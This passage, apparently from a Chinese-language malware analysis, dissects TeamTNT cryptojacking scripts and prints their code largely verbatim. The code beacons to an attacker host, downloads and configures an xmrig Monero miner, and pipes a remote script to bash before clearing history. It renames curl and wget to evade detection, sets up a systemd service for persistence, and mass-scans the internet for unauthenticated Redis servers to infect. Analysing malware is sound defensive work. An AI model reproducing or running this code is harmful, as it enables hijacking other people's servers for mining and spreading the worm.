+wget -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
+wge -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
+wd1 -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
+TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
+<span class="k">else</span> 
+curl  http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+cur http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+cd1 http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+TNTcurl http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+wget -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+wge -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+wd1 -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/cryptonotfount &gt;&gt;/dev/null
+<span class="k">fi</span>
+cat /home/hilde/.ssh/authorized_keys<span class="p">|</span>grep root@puppetserver &gt;/dev/null
+<span class="k">if</span> <span class="o">(</span><span class="nb">test</span> <span class="nv">$?</span> -ne <span class="m">0</span><span class="o">)</span><span class="p">;</span> <span class="k">then</span>
+curl  http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+cur http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+cd1 http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+TNTcurl http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+wget -q -O- http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+wge -q -O- http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authfailed &gt;&gt;/dev/null
+<span class="k">else</span>
+curl  http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+cur http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+cd1 http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+TNTcurl http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+wget -q -O- http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+wge -q -O- http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authok &gt;&gt;/dev/null
+<span class="k">fi</span>
+
+cat /root/.ssh/authorized_keys<span class="p">|</span>grep root@puppetserver &gt;/dev/null
+<span class="k">if</span> <span class="o">(</span><span class="nb">test</span> <span class="nv">$?</span> -ne <span class="m">0</span><span class="o">)</span><span class="p">;</span> <span class="k">then</span>
+curl  http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+cur http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+cd1 http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+TNTcurl http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+wget -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+wge -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authfailedroot &gt;&gt;/dev/null
+<span class="k">else</span>
+curl  http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+cur http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+cd1 http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+TNTcurl http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+wget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+wge -q -O- http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+wd1 -q -O- http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+TNTwget -q -O- http://oracle.zzhreceive.top/b2f628/authokroot &gt;&gt;/dev/null
+<span class="k">fi</span>
+<span class="o">}</span>
+</pre></div>
+<h4 data-content="1" id="efd691e63a76a2215305ae437985772d">下载门罗币挖矿相关并测试运行结果</h4>
+<div class="highlight"><pre><span></span><span class="k">function</span> SetupMoneroOcean1<span class="o">(){</span>
+<span class="c1"># printing intentions</span>
+<span class="nb">echo</span> <span class="s2">"[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"</span>
+<span class="k">if</span> ! curl -L --progress-bar <span class="s2">"</span><span class="nv">$MOxmrigMOD</span><span class="s2">"</span> -o /tmp/xmrig.tar.gz<span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">"ERROR: Can't download </span><span class="nv">$MOxmrigMOD</span><span class="s2"> file to /tmp/xmrig.tar.gz"</span>
+<span class="k">fi</span>
+
+<span class="nb">echo</span> <span class="s2">"[*] Unpacking /tmp/xmrig.tar.gz to </span><span class="nv">$MOHOME</span><span class="s2">/"</span>
+<span class="o">[</span> -d <span class="nv">$MOHOME</span>/ <span class="o">]</span> <span class="o">||</span> mkdir <span class="nv">$MOHOME</span>/
+<span class="k">if</span> ! tar xf /tmp/xmrig.tar.gz -C <span class="nv">$MOHOME</span>/<span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">"ERROR: Can't unpack /tmp/xmrig.tar.gz to </span><span class="nv">$MOHOME</span><span class="s2">/ directory"</span>
+<span class="k">fi</span>
+chmod +x <span class="nv">$MOHOME</span>/<span class="se">\[</span>ext4<span class="se">\]</span>
+rm /tmp/xmrig.tar.gz
+
+<span class="nb">echo</span> <span class="s2">"[*] Checking if advanced version of </span><span class="nv">$MOHOME</span><span class="s2">/xmrig works fine (and not removed by antivirus software)"</span>
+<span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span> --help &gt;/dev/null
+<span class="k">if</span> <span class="o">(</span><span class="nb">test</span> <span class="nv">$?</span> -ne <span class="m">0</span><span class="o">)</span><span class="p">;</span> <span class="k">then</span>
+  <span class="k">if</span> <span class="o">[</span> -f <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">"WARNING: Advanced version of </span><span class="nv">$MOHOME</span><span class="s2">/xmrig is not functional"</span>
+  <span class="k">else</span> 
+    <span class="nb">echo</span> <span class="s2">"WARNING: Advanced version of </span><span class="nv">$MOHOME</span><span class="s2">/xmrig was removed by antivirus (or some other problem)"</span>
+  <span class="k">fi</span>
+
+  <span class="nb">echo</span> <span class="s2">"[*] Looking for the latest version of Monero miner"</span>
+  <span class="c1">#LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`</span>
+  <span class="nv">LATEST_XMRIG_LINUX_RELEASE</span><span class="o">=</span><span class="nv">$MOxmrigSTOCK</span>
+
+  <span class="nb">echo</span> <span class="s2">"[*] Downloading </span><span class="nv">$LATEST_XMRIG_LINUX_RELEASE</span><span class="s2"> to /tmp/xmrig.tar.gz"</span>
+  <span class="k">if</span> ! curl -L --progress-bar <span class="nv">$LATEST_XMRIG_LINUX_RELEASE</span> -o /tmp/xmrig.tar.gz<span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">"ERROR: Can't download </span><span class="nv">$LATEST_XMRIG_LINUX_RELEASE</span><span class="s2"> file to /tmp/xmrig.tar.gz"</span>
+  <span class="k">fi</span>
+
+  <span class="nb">echo</span> <span class="s2">"[*] Unpacking /tmp/xmrig.tar.gz to </span><span class="nv">$MOHOME</span><span class="s2">/"</span>
+  <span class="k">if</span> ! tar xf /tmp/xmrig.tar.gz -C <span class="nv">$MOHOME</span>/ --strip<span class="o">=</span><span class="m">1</span><span class="p">;</span> <span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">"WARNING: Can't unpack /tmp/xmrig.tar.gz to </span><span class="nv">$MOHOME</span><span class="s2">/ directory"</span>
+  <span class="k">fi</span>
+  rm /tmp/xmrig.tar.gz
+chmod +x <span class="nv">$MOHOME</span>/<span class="se">\[</span>ext4<span class="se">\]</span>
+
+  <span class="nb">echo</span> <span class="s2">"[*] Checking if stock version is OKAY!"</span>
+  <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span> --help &gt;/dev/null
+  <span class="k">if</span> <span class="o">(</span><span class="nb">test</span> <span class="nv">$?</span> -ne <span class="m">0</span><span class="o">)</span><span class="p">;</span> <span class="k">then</span> 
+    <span class="k">if</span> <span class="o">[</span> -f <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+      <span class="nb">echo</span> <span class="s2">"ERROR: Stock version of </span><span class="nv">$MOHOME</span><span class="s2">/[ext4] is not functional too"</span>
+    <span class="k">else</span> 
+      <span class="nb">echo</span> <span class="s2">"ERROR: Stock version of </span><span class="nv">$MOHOME</span><span class="s2">/[ext4] was removed by antivirus too"</span>
+    <span class="k">fi</span>
+    <span class="nb">echo</span> <span class="s2">"ERROR: Can't download </span><span class="nv">$LATEST_XMRIG_LINUX_RELEASE</span><span class="s2"> file to /tmp/xmrig.tar.gz"</span>
+  <span class="k">fi</span>
+<span class="k">fi</span>
+
+<span class="nb">echo</span> <span class="s2">"[*] </span><span class="nv">$MOHOME</span><span class="s2">/[ext4] is OK"</span>
+<span class="o">}</span>
+</pre></div>
+<h4 data-content="1" id="263c3b6036c8666a641f2874244ad1c4">TEAMTNT黑产团队标志</h4>
+<div class="highlight"><pre><span></span><span class="c1">######################### printing greetings ###########################</span>
+clear
+<span class="nb">echo</span> -e <span class="s2">" "</span>
+<span class="nb">echo</span> -e <span class="s2">"                                \e[1;34;49m___________                 _____________________________\033[0m"</span>
+<span class="nb">echo</span> -e <span class="s2">"                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"</span>
+<span class="nb">echo</span> -e <span class="s2">"                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"</span>
+<span class="nb">echo</span> -e <span class="s2">"                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"</span>
+<span class="nb">echo</span> -e <span class="s2">"                                \e[1;34;49m  |____| \___  &gt;____  /__|_|  /____|  \____|__  /____|   \033[0m"</span>
+<span class="nb">echo</span> -e <span class="s2">"                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"</span>
+<span class="nb">echo</span> -e <span class="s2">" "</span>
+<span class="nb">echo</span> -e <span class="s2">"                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "</span>
+<span class="nb">echo</span> -e <span class="s2">" "</span>
+<span class="nb">echo</span> -e <span class="s2">"                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"</span>
+<span class="nb">echo</span> <span class="s2">" "</span>
+<span class="nb">echo</span> <span class="s2">" "</span>
+</pre></div>
+<h4 data-content="1" id="eaf45ecc316ab00ea6d94e5f61142661">检查运行的前提条件</h4>
+<p>钱包地址长度、运行环境配置、是否存在curl命令，前期下载的配置文件和其他软件，若没有就执行SetupMoneroOcean1函数；提前设置好配置文件，替换矿池等，控制CPU使用率</p>
+<div class="highlight"><pre><span></span><span class="c1"># checking prerequisites</span>
+
+<span class="k">if</span> <span class="o">[</span> -z <span class="nv">$WALLET</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">"ERROR: wallet"</span>
+<span class="k">fi</span>
+
+<span class="nv">WALLET_BASE</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$WALLET</span> <span class="p">|</span> cut -f1 -d<span class="s2">"."</span><span class="sb">`</span>
+<span class="k">if</span> <span class="o">[</span> <span class="si">${#</span><span class="nv">WALLET_BASE</span><span class="si">}</span> !<span class="o">=</span> <span class="m">95</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">"ERROR: Wrong wallet base address length (should be 95): </span><span class="si">${#</span><span class="nv">WALLET_BASE</span><span class="si">}</span><span class="s2">"</span>
+<span class="k">fi</span>
+
+<span class="k">if</span> <span class="o">[</span> -z <span class="nv">$MOHOME</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">"ERROR: Please define HOME environment variable to your home directory"</span>
+<span class="k">fi</span>
+
+<span class="k">if</span> <span class="o">[</span> ! -d <span class="nv">$MOHOME</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">echo</span> <span class="s2">"ERROR: Please make sure HOME directory </span><span class="nv">$MOHOME</span><span class="s2"> exists or set it yourself using this command:"</span>
+  <span class="nb">echo</span> <span class="s1">'  export HOME=&lt;dir&gt;'</span>
+<span class="k">fi</span>
+
+
+<span class="k">if</span> ! <span class="nb">type</span> curl &gt;/dev/null<span class="p">;</span> <span class="k">then</span>
+apt-get update --fix-missing <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null
+apt-get install -y curl <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null
+apt-get install -y --reinstall curl <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null
+yum clean all <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null
+yum install -y curl <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null
+yum reinstall -y curl <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null
+<span class="k">fi</span>
+
+sleep <span class="m">2</span>
+<span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span> --help &gt;/dev/null
+<span class="k">if</span> <span class="o">(</span><span class="nb">test</span> <span class="nv">$?</span> -ne <span class="m">0</span><span class="o">)</span><span class="p">;</span> <span class="k">then</span>
+    SetupMoneroOcean1
+<span class="k">else</span>
+    <span class="nb">echo</span> <span class="s2">"WARNING: Advanced version of </span><span class="nv">$MOHOME</span><span class="s2">/xmrig was removed by antivirus (or some other problem)"</span>
+<span class="k">fi</span>
+
+<span class="k">if</span> <span class="o">[</span> -f <span class="s2">"</span><span class="nv">$MOHOME</span><span class="s2">/[ext4].pid"</span> <span class="o">]</span>
+ <span class="k">then</span>
+         <span class="nb">echo</span> <span class="s2">"config file exists, neednot backup"</span>
+ <span class="k">else</span>
+         <span class="nb">echo</span> <span class="s2">"config file not exists.download from teamtnt"</span>
+         SetupMoneroOcean1
+<span class="k">fi</span>
+
+
+<span class="k">if</span> <span class="o">[</span> -f <span class="s2">"</span><span class="nv">$MOHOME</span><span class="s2">/[ext4]"</span> <span class="o">]</span>
+ <span class="k">then</span>
+         <span class="nb">echo</span> <span class="s2">"miner file exists"</span>
+ <span class="k">else</span>
+         curl -L --progress-bar <span class="nv">$miner_url</span> -o /tmp/xmrig.tar.gz <span class="o">&amp;&amp;</span> tar -xf /tmp/xmrig.tar.gz -C <span class="nv">$MOHOME</span>/ <span class="o">&amp;&amp;</span> mv <span class="nv">$MOHOME</span>/xmrig*/xmrig  <span class="nv">$MOHOME</span>/<span class="se">\[</span>ext4<span class="se">\]</span>
+<span class="k">fi</span>
+
+<span class="k">if</span> <span class="o">[</span> -f <span class="s2">"</span><span class="nv">$MOHOME</span><span class="s2">/[ext4].pid"</span> <span class="o">]</span>
+<span class="k">then</span>
+    <span class="nb">echo</span> <span class="s2">"miner config exists"</span>
+<span class="k">else</span>
+    curl -L --progress-bar <span class="nv">$config_url</span> -o  <span class="nv">$MOHOME</span>/<span class="se">\[</span>ext4<span class="se">\]</span>.pid
+<span class="k">fi</span>
+
+rm /tmp/xmrig.tar.gz
+
+<span class="k">if</span> <span class="o">[</span> -f <span class="s2">"</span><span class="nv">$MOHOME</span><span class="s2">/[ext4]"</span> <span class="o">]</span>
+ <span class="k">then</span>
+         <span class="nb">echo</span> <span class="s2">"miner file exists, neednot backup"</span>
+ <span class="k">else</span>
+         curl -L --progress-bar <span class="nv">$miner_url_backup</span> -o  /tmp/xmrig.tar.gz <span class="o">&amp;&amp;</span> tar -xf /tmp/xmrig.tar.gz -C <span class="nv">$MOHOME</span>/ <span class="o">&amp;&amp;</span> chmod +x <span class="nv">$MOHOME</span>/<span class="se">\[</span>ext4<span class="se">\]</span>
+<span class="k">fi</span>
+
+rm /tmp/cf.tar
+
+
+sed -i <span class="s1">'s/"url": *"[^"]*",/"url": "xmr-asia1.nanopool.org:14444",/'</span> <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.pid
+sed -i <span class="s1">'s/"user": *"[^"]*",/"user": "'</span><span class="nv">$WALLET</span><span class="s1">'",/'</span> <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.pid
+sed -i <span class="s1">'s/"coin": *[^"]*,/"coin": "monero",/'</span> <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.pid
+sed -i <span class="s1">'s/"max-threads-hint": *[^,]*,/"max-threads-hint": 50,/'</span> <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.pid
+sed -i <span class="s1">'s#"log-file": *null,#"log-file": "'</span><span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.log<span class="s1">'",#'</span> <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.pid
+sed -i <span class="s1">'s/"syslog": *[^,]*,/"syslog": true,/'</span> <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.pid
+
+cp <span class="nv">$MOHOME</span>/<span class="o">[</span>ext4<span class="o">]</span>.pid <span class="nv">$MOHOME</span>/config_background.json
+sed -i <span class="s1">'s/"background": *false,/"background": true,/'</span> <span class="nv">$MOHOME</span>/config_background.json
+</pre></div>
+<h4 data-content="1" id="6e068b067d40f9112810af2221d565c2">静默下载<code>cronis.sh</code>并运行</h4>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">echo</span> <span class="s2">"[*] Setup complete"</span>
+curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/cronis.sh <span class="p">|</span> bash <span class="o">||</span> cd1 -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/cronis.sh <span class="p">|</span> bash
+<span class="nb">history</span> -c
+</pre></div>
+<h3 data-content="1" id="6dd5c4730d04ee1ecfd3963e6cdad7cd">样本分析——cronis.sh</h3>
+<h4 data-content="1" id="1e4ca32de3c248e4ad95869ea15f9085">命令替换绕检测</h4>
+<p>创建变量后期使用，修改命令绕过检测机制</p>
+<pre><code>rtdir="/etc/svcupdates"
+bbdir="/usr/bin/curl"
+bbdira="/usr/bin/cd1"
+ccdir="/usr/bin/wget"
+ccdira="/usr/bin/wd1"
+mv /usr/bin/curl /usr/bin/url
+mv /usr/bin/url /usr/bin/cd1
+mv /usr/bin/wget /usr/bin/get
+mv /usr/bin/get /usr/bin/wd1
+sleep $( seq 3 7 | sort -R | head -n1 )</code></pre>
+<h4 data-content="1" id="dfb8ac508638ca51bf24b03eb8a542cf">安装扫描程序</h4>
+<p>安装pnscan，masscan扫描器，并下载后续脚本cronscan</p>
+<pre><code>sleep 1
+echo "DER Uninstalled"
+if ! [ -x "$(command -v masscan)" ]; then
+rm -rf /var/lib/apt/lists/*
+rm -rf x1.tar.gz
+sleep 1
+$bbdira -sL -o x1.tar.gz http://oracle.zzhreceive.top/b2f628fff19fda999999999/1.0.4.tar.gz
+sleep 1
+[ -f x1.tar.gz ] &amp;&amp; tar zxf x1.tar.gz &amp;&amp; cd masscan-1.0.4 &amp;&amp; make &amp;&amp; make install &amp;&amp; cd .. &amp;&amp; rm -rf masscan-1.0.4
+echo "Masscan Installed"
+fi
+echo "Masscan Already Installed"
+sleep 3 &amp;&amp; rm -rf .watch
+if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
+$bbdira -sL -o .x112 http://oracle.zzhreceive.top/b2f628/p.tar || $ccdira -q -O .x112 http://oracle.zzhreceive.top/b2f628/p.tar 
+sleep 1
+[ -f .x112 ] &amp;&amp; tar xf .x112&amp;&amp; cd pnscan &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install &amp;&amp; cd .. &amp;&amp; rm -rf pnscan .x112
+echo "Pnscan Installed"
+fi
+echo "Pnscan Already Installed"
+
+$bbdir -fsSL http://oracle.zzhreceive.top/b2f628/cronscan | bash
+$bbdira -fsSL http://oracle.zzhreceive.top/b2f628/cronscan | bash</code></pre>
+<h3 data-content="1" id="9300a8837142310273ebd693678b8e2b">样本分析——cronscan</h3>
+<p>下载cronrs.sh，创建扫描服务，启动pnscan和masscan扫描器</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> ! <span class="nb">type</span> systemctl &gt;/dev/null<span class="p">;</span> <span class="k">then</span>
+
+    <span class="nv">$aabb</span> -fsSL http://oracle.zzhreceive.top/b2f628/cronrs.sh <span class="p">|</span> bash
+
+  <span class="k">else</span>
+
+    <span class="nb">echo</span> <span class="s2">"[*] Creating scan systemd service"</span>
+<span class="nv">$aabb</span> -fsSL http://oracle.zzhreceive.top/b2f628/cronrs.sh -o /var/tmp/.system/<span class="se">\[</span>scan<span class="se">\]</span> <span class="o">&amp;&amp;</span> chmod <span class="m">744</span> /var/tmp/.system/<span class="se">\[</span>scan<span class="se">\]</span>
+    cat &gt;/tmp/scan.service <span class="s">&lt;&lt;EOL</span>
+<span class="s">[Service]</span>
+<span class="s">ExecStart=/var/tmp/.system/[scan]</span>
+<span class="s">Restart=always</span>
+
+<span class="s">[Install]</span>
+<span class="s">WantedBy=default.target</span>
+<span class="s">EOL</span>
+    sudo mv /tmp/scan.service /etc/systemd/system/scan.service
+    <span class="nb">echo</span> <span class="s2">"[*] Starting scan systemd service"</span>
+    sudo killall <span class="o">[</span>scan<span class="o">]</span> <span class="m">2</span>&gt;/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl <span class="nb">enable</span> scan.service
+    sudo systemctl start scan.service
+<span class="k">fi</span>
+</pre></div>
+<h3 data-content="1" id="11704d38c6d27195250e6d00b224b992">样本分析——cronrs.sh</h3>
+<p>运行扫描器查找<code>192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16</code>ip段的redis未授权漏洞扩大攻击范围。</p>
+<div class="highlight"><pre><span></span><span class="nv">pnx</span><span class="o">=</span>pnscan
+    <span class="o">[</span> -x /usr/local/bin/pnscan <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">pnx</span><span class="o">=</span>/usr/local/bin/pnscan
+    <span class="o">[</span> -x /usr/bin/pnscan <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">pnx</span><span class="o">=</span>/usr/bin/pnscan
+    <span class="k">for</span> z in <span class="k">$(</span> seq <span class="m">0</span> <span class="m">5000</span> <span class="p">|</span> sort -R <span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+    <span class="k">for</span> x in <span class="k">$(</span> <span class="nb">echo</span> -e <span class="s2">"47\n39\n8\n121\n106\n120\n123\n65\n3\n101\n139\n99\n63\n81\n44\n18\n119\n100\n42\n49\n118\n54\n1\n50\n114\n182\n52\n13\n34\n112\n115\n111\n116\n16\n35\n117\n124\n59\n36\n103\n82\n175\n122\n129\n45\n152\n159\n113\n15\n61\n180\n172\n157\n60\n218\n176\n58\n204\n140\n184\n150\n193\n223\n192\n75\n46\n188\n183\n222\n14\n104\n27\n221\n211\n132\n107\n43\n212\n148\n110\n62\n202\n95\n220\n154\n23\n149\n125\n210\n203\n185\n171\n146\n109\n94\n219\n134"</span> <span class="p">|</span> sort -R <span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+    <span class="k">for</span> y in <span class="k">$(</span> seq <span class="m">0</span> <span class="m">255</span> <span class="p">|</span> sort -R <span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+    <span class="nv">$pnx</span> -t256 -R <span class="s1">'6f 73 3a 4c 69 6e 75 78'</span> -W <span class="s1">'2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a'</span> <span class="nv">$x</span>.<span class="nv">$y</span>.0.0/16 <span class="m">6379</span> &gt; .r.<span class="nv">$x</span>.<span class="nv">$y</span>.o
+    awk <span class="s1">'/Linux/ {print $1, $3}'</span> .r.<span class="nv">$x</span>.<span class="nv">$y</span>.o &gt; .r.<span class="nv">$x</span>.<span class="nv">$y</span>.l
+    <span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+    cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw <span class="p">&amp;</span>
+    <span class="k">done</span> &lt; .r.<span class="nv">$x</span>.<span class="nv">$y</span>.l
+    <span class="k">done</span>
+    <span class="k">done</span>
+        <span class="k">done</span>
+    sleep <span class="m">1</span>
+    masscan --max-rate <span class="m">10000</span> -p6379 --shard <span class="k">$(</span> seq <span class="m">1</span> <span class="m">22000</span> <span class="p">|</span> sort -R <span class="p">|</span> head -n1 <span class="k">)</span>/22000 --exclude <span class="m">255</span>.255.255.255 <span class="m">0</span>.0.0.0/0 <span class="m">2</span>&gt;/dev/null <span class="p">|</span> awk <span class="s1">'{print $6, substr($4, 1, length($4)-4)}'</span> <span class="p">|</span> sort <span class="p">|</span> uniq &gt; .shard
+    sleep <span class="m">1</span>
+    <span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+    cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null <span class="p">&amp;</span>
+    <span class="k">done</span> &lt; .shard
+    sleep <span class="m">1</span>
+    masscan --max-rate <span class="m">10000</span> -p6379 <span class="m">192</span>.168.0.0/16 <span class="m">172</span>.16.0.0/16 <span class="m">116</span>.62.0.0/16 <span class="m">116</span>.232.0.0/16 <span class="m">116</span>.128.0.0/16 <span class="m">116</span>.163.0.0/16 <span class="m">2</span>&gt;/dev/null <span class="p">|</span> awk <span class="s1">'{print $6, substr($4, 1, length($4)-4)}'</span> <span class="p">|</span> sort <span class="p">|</span> uniq &gt; .ranges
+    sleep <span class="m">1</span>
+    <span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+    cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null <span class="p">&amp;</span>
+    <span class="k">done</span> &lt; .ranges
+    sleep <span class="m">1</span>
+    ip a <span class="p">|</span> grep -oE <span class="s1">'([0-9]{1,3}.?){4}/[0-9]{2}'</span> <span class="m">2</span>&gt;/dev/null <span class="p">|</span> sed <span class="s1">'s/\/\([0-9]\{2\}\)/\/16/g'</span> &gt; .inet
+    sleep <span class="m">1</span>
+    masscan --max-rate <span class="m">10000</span> -p6379 -iL .inet <span class="p">|</span> awk <span class="s1">'{print $6, substr($4, 1, length($4)-4)}'</span> <span class="p">|</span> sort <span class="p">|</span> uniq &gt; .lan
+    sleep <span class="m">1</span>
+    <span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+    cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null <span class="p">&amp;</span>
+    <span class="k">done</span> &lt; .lan
+    sleep <span class="m">60</span>
+    rm -rf .dat .shard .ranges .lan <span class="m">2</span>&gt;/dev/null
+</pre></div>
+<p>萌新第一次写样本分析，如果有写的不好或者分析失误的地方望表哥们轻喷。</p>
+<h1 data-content="1" id="44f82cb26b8e0ed45777a85c9eee1052">Refer</h1>
+<p><a href="https://paper.seebug.org/1477/" target="_blank">https://paper.seebug.org/1477/</a></p>
+<p><a href="https://www.hackingarticles.in/docker-for-pentester-abusing-docker-api/" target="_blank">https://www.hackingarticles.in/docker-for-pentester-abusing-docker-api/</a></p>
+<p><a href="https://blog.csdn.net/mdzz14/article/details/111656726" target="_blank">https://blog.csdn.net/mdzz14/article/details/111656726</a></p>
+<p><a href="https://blog.csdn.net/u013642886/article/details/115934635" target="_blank">https://blog.csdn.net/u013642886/article/details/115934635</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1828407" target="_blank">https://cloud.tencent.com/developer/article/1828407</a></p>
+<p><a href="https://github.com/m0nad/Diamorphine" target="_blank">https://github.com/m0nad/Diamorphine</a></p>
+</div>
+</div>
